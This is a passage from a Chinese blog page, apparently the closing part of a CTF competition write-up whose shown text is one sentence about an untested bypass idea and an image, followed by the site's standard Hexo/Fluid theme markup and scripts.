+<p>然后根据如此绕过即可，因为我没解密出密码来，就没办法去试了，但是思路应该是这样的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769871159794-2a2f7499-624f-405f-8254-88268680907e.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/note/" class="category-chain-item">note</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>最近的一些比赛</div>
+      <div>https://rightevil.github.io/最近的一些比赛/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>rightevil</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-TransformedMap/" title="Java学习笔记5-TransformedMap">
+                        <span class="hidden-mobile">Java学习笔记5-TransformedMap</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="lv-container" data-id="city" data-uid="MTAyMC81NzQyNC8zMzg4OA==">
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#lv-container', function() {
+        Fluid.utils.createScript('https://cdn-city.livere.com/js/embed.dist.js');
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
